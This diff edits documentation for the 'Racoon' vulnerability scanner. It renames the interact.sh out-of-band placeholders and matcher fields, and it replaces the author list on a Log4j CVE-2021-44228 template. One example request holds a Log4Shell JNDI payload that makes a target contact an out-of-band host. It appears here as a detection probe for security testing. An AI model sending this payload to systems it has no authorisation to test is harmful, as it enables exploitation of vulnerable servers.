@@ -50,7 +50,7 @@ Example:
 info:
   id: CVE-2021-44228
   name: Apache Log4j2 Remote Code Injection
-  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
+  author: Hung, Dat, Danh, Hoa
   severity: critical
   description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
   recommendation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
@@ -60,7 +60,7 @@ info:
     - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
     - https://www.lunasec.io/docs/blog/log4j-zero-day/
     - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
-  tags: cve,cve2021,rce,oast,log4j,injection
+  tags: cve,cve2021,rce,log4j
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10.00
@@ -520,24 +520,24 @@ group: 2 for second match
 And so on.
 ```
 
-**OOB Testing**
+**Out-of-band Scanning**
 
 ---
 
-Racoon supports using the interact.sh API to achieve OOB based vulnerability scanning.
+Racoon use the interact.sh for OOB based scanning.
 
-**Interactsh Placeholder**
+**Interactsh Variable**
 
 ---
 
-**{{interactsh-url}}** placeholder is used in both http and https in network requests.
+**{{interactUrl}}** placeholder can be used in both http and https requests.
 
 Each request is provided each unique interact.sh URLs.
 
 ```
 - request:
       - |
-        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
+        GET /?x=${jndi:ldap://${hostName}.uri.{{interactUrl}}/a} HTTP/1.1
         Host: {{Hostname}}
 ```
 
@@ -547,25 +547,25 @@ Each request is provided each unique interact.sh URLs.
 
 Interactsh interactions can be used with word, regex or helper matcher/exposer
 
-> interactsh_protocol: dns, http or smtp. 
+> interact_protocol: dns, http or smtp. 
 ```
 matchers:
   - type: word
-    part: interactsh_protocol
+    part: interact_protocol
     words:
       - "dns"
 ```
 
->interactsh_request: the request that the interact.sh server received
+> interact_req: the request that the interact.sh server received
 ```
 exposer:
   - type: regex
-    part: interactsh_request
+    part: interact_req
     group: 1
     regex:
       - 'GET \/([a-z-]+) HTTP'
 ```
->interactsh_response: the response that the interact.sh server sent to the client
+>interact_res: the response that the interact.sh server sent to the client
 
 <a href="#menu"> Back to main menu </a>
 
